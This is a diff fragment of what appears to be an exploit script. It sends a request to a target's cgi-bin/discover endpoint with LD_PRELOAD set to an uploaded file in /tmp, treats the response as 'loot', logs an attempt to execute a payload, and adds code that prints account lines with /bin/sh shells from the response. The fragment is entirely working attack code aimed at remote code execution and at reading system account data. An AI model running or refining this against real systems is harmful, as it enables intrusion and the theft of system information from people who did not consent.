@@ -66,6 +66,11 @@ def main():
     loot = s.get(f"https://{host}/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp")
     logger.info("Attempting to execute payload")
 
+    content = loot.content.decode('utf-8')
+    for line in content.split('\n'):
+        if line and '/bin/sh' in line and '0:0:0' not in line:
+            print(line)
+
 if __name__ == "__main__":
     main()
 
